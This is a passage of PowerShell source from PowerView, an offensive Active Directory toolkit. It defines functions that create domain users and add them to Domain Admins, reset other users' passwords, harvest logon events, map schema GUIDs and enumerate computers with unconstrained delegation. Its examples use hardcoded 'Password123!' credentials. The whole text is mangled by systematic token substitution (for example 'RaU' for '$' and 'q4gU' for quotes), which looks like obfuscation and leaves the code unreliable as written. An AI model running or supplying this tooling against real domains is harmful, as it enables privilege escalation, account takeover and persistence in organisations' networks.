Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.UserPrincipal with the specified user properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the user to create.
Maximum of 256 characters. Mandatory.

.PARAMETER AccountPassword

Specifies the password for the created user. Mandatory.

.PARAMETER Name

Specifies the name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the user to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

RaUUserPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description q4gUThis is harmj0yq4gU -AccountPassword RaUUserPassword

Creates the q4gUharmj0y2q4gU user with the specified description and password.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
RaUUserPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUuser = New-DomainUser -SamAccountName harmj0y2 -Description q4gUThis is harmj0yq4gU -AccountPassword RaUUserPassword -Credential RaUCred

Creates the q4gUharmj0y2q4gU user with the specified description and password, using the specified
alternate credentials.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
RaUUserPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword RaUUserPassword -Credential RaUCred wZ5t Add-DomainGroupMember q4gUDomain Adminsq4gU -Credential RaUCred

Creates the q4gUandyq4gU user with the specified description and password, using the specified
alternate credentials, and adds the user to q4gUdomain adminsq4gU using Add-DomainGroupMember
and the alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUDirectoryServices.AccountManagement.UserPrincipalq4gU)]
    Param(
        [Parameter(Mandatory = RaUTrue)]
        [ValidateLength(0, 256)]
        [String]
        RaUSamAccountName,

        [Parameter(Mandatory = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUPasswordq4gU)]
        [Security.SecureString]
        RaUAccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDescription,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    RaUContextArguments = @{
        q4gUIdentityq4gU = RaUSamAccountName
    }
    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUContextArguments[q4gUDomainq4gU] = RaUDomain }
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUContextArguments[q4gUCredentialq4gU] = RaUCredential }
    RaUContext = Get-PrincipalContext @ContextArguments

    if (RaUContext) {
        RaUUser = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList (RaUContext.Context)

        # set all the appropriate user parameters
        RaUUser.SamAccountName = RaUContext.Identity
        RaUTempCred = New-Object System.Management.Automation.PSCredential(q4gUaq4gU, RaUAccountPassword)
        RaUUser.SetPassword(RaUTempCred.GetNetworkCredential().Password)
        RaUUser.Enabled = RaUTrue
        RaUUser.PasswordNotRequired = RaUFalse

        if (RaUPSBoundParameters[q4gUNameq4gU]) {
            RaUUser.Name = RaUName
        }
        else {
            RaUUser.Name = RaUContext.Identity
        }
        if (RaUPSBoundParameters[q4gUDisplayNameq4gU]) {
            RaUUser.DisplayName = RaUDisplayName
        }
        else {
            RaUUser.DisplayName = RaUContext.Identity
        }

        if (RaUPSBoundParameters[q4gUDescriptionq4gU]) {
            RaUUser.Description = RaUDescription
        }

        Write-Verbose Oj8X[New-DomainUser] Attempting to create user q4gURaUSamAccountNameq4gUOj8X
        try {
            RaUNull = RaUUser.Save()
            Write-Verbose Oj8X[New-DomainUser] User q4gURaUSamAccountNameq4gU successfully createdOj8X
            RaUUser
        }
        catch {
            Write-Warning Oj8X[New-DomainUser] Error creating user q4gURaUSamAccountNameq4gU : RaU_Oj8X
        }
    }
}


function Set-DomainUserPassword {
<#
.SYNOPSIS

Sets the password for a given user identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified user -Identity,
which returns a DirectoryServices.AccountManagement.UserPrincipal object. The
SetPassword() function is then invoked on the user, setting the password to -AccountPassword.

.PARAMETER Identity

A user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
specifying the user to reset the password for.

.PARAMETER AccountPassword

Specifies the password to reset the target userq4gUs to. Mandatory.

.PARAMETER Domain

Specifies the domain to use to search for the user identity, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

RaUUserPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword RaUUserPassword

Resets the password for q4gUandyq4gU to the password specified.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
RaUUserPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword RaUUserPassword -Credential RaUCred

Resets the password for q4gUandyq4gU usering the alternate credentials specified.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUDirectoryServices.AccountManagement.UserPrincipalq4gU)]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue)]
        [Alias(q4gUUserNameq4gU, q4gUUserIdentityq4gU, q4gUUserq4gU)]
        [String]
        RaUIdentity,

        [Parameter(Mandatory = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUPasswordq4gU)]
        [Security.SecureString]
        RaUAccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    RaUContextArguments = @{ q4gUIdentityq4gU = RaUIdentity }
    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUContextArguments[q4gUDomainq4gU] = RaUDomain }
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUContextArguments[q4gUCredentialq4gU] = RaUCredential }
    RaUContext = Get-PrincipalContext @ContextArguments

    if (RaUContext) {
        RaUUser = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(RaUContext.Context, RaUIdentity)

        if (RaUUser) {
            Write-Verbose Oj8X[Set-DomainUserPassword] Attempting to set the password for user q4gURaUIdentityq4gUOj8X
            try {
                RaUTempCred = New-Object System.Management.Automation.PSCredential(q4gUaq4gU, RaUAccountPassword)
                RaUUser.SetPassword(RaUTempCred.GetNetworkCredential().Password)

                RaUNull = RaUUser.Save()
                Write-Verbose Oj8X[Set-DomainUserPassword] Password for user q4gURaUIdentityq4gU successfully resetOj8X
            }
            catch {
                Write-Warning Oj8X[Set-DomainUserPassword] Error setting password for user q4gURaUIdentityq4gU : RaU_Oj8X
            }
        }
        else {
            Write-Warning Oj8X[Set-DomainUserPassword] Unable to find user q4gURaUIdentityq4gUOj8X
        }
    }
}


function Get-DomainUserEvent {
<#
.SYNOPSIS

Enumerate account logon events (ID 4624) and Logon with explicit credential
events (ID 4648) from the specified host (default of the localhost).

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses an XML path filter passed to Get-WinEvent to retrieve
security events with IDs of 4624 (logon events) or 4648 (explicit credential
logon events) from -StartTime (default of now-1 day) to -EndTime (default of now).
A maximum of -MaxEvents (default of 5000) are returned.

.PARAMETER ComputerName

Specifies the computer name to retrieve events from, default of localhost.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events to retrieve. Default of 5000.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer.

.EXAMPLE

Get-DomainUserEvent

Return logon events on the local machine.

.EXAMPLE

Get-DomainController wZ5t Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))

Return all logon events from the last 3 days from every domain controller in the current domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential RaUCred -MaxEvents 1000

Return a max of 1000 logon events from the specified machine using the specified alternate credentials.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogonEvent

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.LogonEventq4gU)]
    [OutputType(q4gUPowerView.ExplicitCredentialLogonEventq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUdnshostnameq4gU, q4gUHostNameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = RaUEnv:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaUStartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaUEndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        RaUMaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # the XML filter weq4gUre passing to Get-WinEvent
        RaUXPathFilter = @Oj8X
<QueryList>
    <Query Id=Oj8X0Oj8X Path=Oj8XSecurityOj8X>

        <!-- Logon events -->
        <Select Path=Oj8XSecurityOj8X>
            *[
                System[
                    Provider[
                        @Name=q4gUMicrosoft-Windows-Security-Auditingq4gU
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;=q4gURaU(RaUStartTime.ToUniversalTime().ToString(q4gUsq4gU))q4gU and @SystemTime&lt;=q4gURaU(RaUEndTime.ToUniversalTime().ToString(q4gUsq4gU))q4gU
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name=q4gUTargetUserNameq4gU] != q4gUANONYMOUS LOGONq4gU]]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path=Oj8XSecurityOj8X>
            *[
                System[
                    Provider[
                        @Name=q4gUMicrosoft-Windows-Security-Auditingq4gU
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;=q4gURaU(RaUStartTime.ToUniversalTime().ToString(q4gUsq4gU))q4gU and @SystemTime&lt;=q4gURaU(RaUEndTime.ToUniversalTime().ToString(q4gUsq4gU))q4gU
                    ]
                ]
            ]
        </Select>

        <Suppress Path=Oj8XSecurityOj8X>
            *[
                System[
                    Provider[
                        @Name=q4gUMicrosoft-Windows-Security-Auditingq4gU
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name=q4gULogonTypeq4gU]=q4gU5q4gU or Data[@Name=q4gULogonTypeq4gU]=q4gU0q4gU)
                        or
                        Data[@Name=q4gUTargetUserNameq4gU]=q4gUANONYMOUS LOGONq4gU
                        or
                        Data[@Name=q4gUTargetUserSIDq4gU]=q4gUS-1-5-18q4gU
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
Oj8X@
        RaUEventArguments = @{
            q4gUFilterXPathq4gU = RaUXPathFilter
            q4gULogNameq4gU = q4gUSecurityq4gU
            q4gUMaxEventsq4gU = RaUMaxEvents
        }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUEventArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {

            RaUEventArguments[q4gUComputerNameq4gU] = RaUComputer

            Get-WinEvent @EventArgumentswZ5t ForEach-Object {
                RaUEvent = RaU_
                RaUProperties = RaUEvent.Properties
                Switch (RaUEvent.Id) {
                    # logon event
                    4624 {
                        # skip computer logons, for now...
                        if(-not RaUProperties[5].Value.EndsWith(q4gURaUq4gU)) {
                            RaUOutput = New-Object PSObject -Property @{
                                ComputerName              = RaUComputer
                                TimeCreated               = RaUEvent.TimeCreated
                                EventId                   = RaUEvent.Id
                                SubjectUserSid            = RaUProperties[0].Value.ToString()
                                SubjectUserName           = RaUProperties[1].Value
                                SubjectDomainName         = RaUProperties[2].Value
                                SubjectLogonId            = RaUProperties[3].Value
                                TargetUserSid             = RaUProperties[4].Value.ToString()
                                TargetUserName            = RaUProperties[5].Value
                                TargetDomainName          = RaUProperties[6].Value
                                TargetLogonId             = RaUProperties[7].Value
                                LogonType                 = RaUProperties[8].Value
                                LogonProcessName          = RaUProperties[9].Value
                                AuthenticationPackageName = RaUProperties[10].Value
                                WorkstationName           = RaUProperties[11].Value
                                LogonGuid                 = RaUProperties[12].Value
                                TransmittedServices       = RaUProperties[13].Value
                                LmPackageName             = RaUProperties[14].Value
                                KeyLength                 = RaUProperties[15].Value
                                ProcessId                 = RaUProperties[16].Value
                                ProcessName               = RaUProperties[17].Value
                                IpAddress                 = RaUProperties[18].Value
                                IpPort                    = RaUProperties[19].Value
                                ImpersonationLevel        = RaUProperties[20].Value
                                RestrictedAdminMode       = RaUProperties[21].Value
                                TargetOutboundUserName    = RaUProperties[22].Value
                                TargetOutboundDomainName  = RaUProperties[23].Value
                                VirtualAccount            = RaUProperties[24].Value
                                TargetLinkedLogonId       = RaUProperties[25].Value
                                ElevatedToken             = RaUProperties[26].Value
                            }
                            RaUOutput.PSObject.TypeNames.Insert(0, q4gUPowerView.LogonEventq4gU)
                            RaUOutput
                        }
                    }

                    # logon with explicit credential
                    4648 {
                        # skip computer logons, for now...
                        if((-not RaUProperties[5].Value.EndsWith(q4gURaUq4gU)) -and (RaUProperties[11].Value -match q4gUtaskhostScKj.exeq4gU)) {
                            RaUOutput = New-Object PSObject -Property @{
                                ComputerName              = RaUComputer
                                TimeCreated       = RaUEvent.TimeCreated
                                EventId           = RaUEvent.Id
                                SubjectUserSid    = RaUProperties[0].Value.ToString()
                                SubjectUserName   = RaUProperties[1].Value
                                SubjectDomainName = RaUProperties[2].Value
                                SubjectLogonId    = RaUProperties[3].Value
                                LogonGuid         = RaUProperties[4].Value.ToString()
                                TargetUserName    = RaUProperties[5].Value
                                TargetDomainName  = RaUProperties[6].Value
                                TargetLogonGuid   = RaUProperties[7].Value
                                TargetServerName  = RaUProperties[8].Value
                                TargetInfo        = RaUProperties[9].Value
                                ProcessId         = RaUProperties[10].Value
                                ProcessName       = RaUProperties[11].Value
                                IpAddress         = RaUProperties[12].Value
                                IpPort            = RaUProperties[13].Value
                            }
                            RaUOutput.PSObject.TypeNames.Insert(0, q4gUPowerView.ExplicitCredentialLogonEventq4gU)
                            RaUOutput
                        }
                    }
                    default {
                        Write-Warning Oj8XNo handler exists for event ID: RaU(RaUEvent.Id)Oj8X
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {
<#
.SYNOPSIS

Helper to build a hash table of [GUID] -> resolved names for the current or specified Domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-Forest  

.DESCRIPTION

Searches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for
all objects with schemaIDGUID set and translates the GUIDs discovered to human-readable names.
Then searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)
for objects where objectClass=controlAccessRight, translating the GUIDs again.

Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.OUTPUTS

Hashtable

Ouputs a hashtable containing a GUID -> Readable Name mapping.

.LINK

http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    RaUGUIDs = @{q4gU00000000-0000-0000-0000-000000000000q4gU = q4gUAllq4gU}

    RaUForestArguments = @{}
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUForestArguments[q4gUCredentialq4gU] = RaUCredential }

    try {
        RaUSchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw q4gU[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forestq4gU
    }
    if (-not RaUSchemaPath) {
        throw q4gU[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forestq4gU
    }

    RaUSearcherArguments = @{
        q4gUSearchBaseq4gU = RaUSchemaPath
        q4gULDAPFilterq4gU = q4gU(schemaIDGUID=*)q4gU
    }
    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
    if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
    if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
    if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
    RaUSchemaSearcher = Get-DomainSearcher @SearcherArguments

    if (RaUSchemaSearcher) {
        try {
            RaUResults = RaUSchemaSearcher.FindAll()
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUGUIDs[(New-Object Guid (,RaU_.properties.schemaidguid[0])).Guid] = RaU_.properties.name[0]
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainGUIDMap] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUSchemaSearcher.dispose()
        }
        catch {
            Write-Verbose Oj8X[Get-DomainGUIDMap] Error in building GUID map: RaU_Oj8X
        }
    }

    RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSchemaPath.replace(q4gUSchemaq4gU,q4gUExtended-Rightsq4gU)
    RaUSearcherArguments[q4gULDAPFilterq4gU] = q4gU(objectClass=controlAccessRight)q4gU
    RaURightsSearcher = Get-DomainSearcher @SearcherArguments

    if (RaURightsSearcher) {
        try {
            RaUResults = RaURightsSearcher.FindAll()
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUGUIDs[RaU_.properties.rightsguid[0].toString()] = RaU_.properties.name[0]
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainGUIDMap] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaURightsSearcher.dispose()
        }
        catch {
            Write-Verbose Oj8X[Get-DomainGUIDMap] Error in building GUID map: RaU_Oj8X
        }
    }

    RaUGUIDs
}


function Get-DomainComputer {
<#
.SYNOPSIS

Return all computers or specific computer objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties samaccountname,usnchanged,...Oj8X. By default, all computer objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. WINDOWS10RaU), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from RaUUACEnum, including
Oj8XNOT_XOj8X negation forms. To see all possible values, run q4gU0wZ5tConvertFrom-UACValue -ShowAllq4gU.

.PARAMETER Unconstrained

Switch. Return computer objects that have unconstrained delegation.

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER Printers

Switch. Return only printers.

.PARAMETER SPN

Return computers with a specific service principal name, wildcards accepted.

.PARAMETER OperatingSystem

Return computers with a specific operating system, wildcards accepted.

.PARAMETER ServicePack

Return computers with a specific service pack, wildcards accepted.

.PARAMETER SiteName

Return computers in the specific AD Site name, wildcards accepted.

.PARAMETER Ping

Switch. Ping each host to ensure itq4gUs up before enumerating.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainComputer

Returns the current computers in current domain.

.EXAMPLE

Get-DomainComputer -SPN mssql* -Domain testlab.local

Returns all MS SQL servers in the testlab.local domain.

.EXAMPLE

Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname

Return the dns hostnames of servers trusted for delegation.

.EXAMPLE

Get-DomainComputer -SearchBase Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X -Unconstrained

Search the specified OU for computeres that allow unconstrained delegation.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainComputer -Credential RaUCred

.OUTPUTS

PowerView.Computer

Custom PSObject with translated computer property fields.

PowerView.Computer.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [OutputType(q4gUPowerView.Computerq4gU)]
    [OutputType(q4gUPowerView.Computer.Rawq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUDNSHostNameq4gU)]
        [String[]]
        RaUIdentity,

        [Switch]
        RaUUnconstrained,

        [Switch]
        RaUTrustedToAuth,

        [Switch]
        RaUPrinters,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUServicePrincipalNameq4gU)]
        [String]
        RaUSPN,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUSiteName,

        [Switch]
        RaUPing,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    DynamicParam {
        RaUUACValueNames = [Enum]::GetNames(RaUUACEnum)
        # add in the negations
        RaUUACValueNames = RaUUACValueNames wZ5t ForEach-Object {RaU_; Oj8XNOT_RaU_Oj8X}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet RaUUACValueNames -Type ([array])
    }

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUCompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
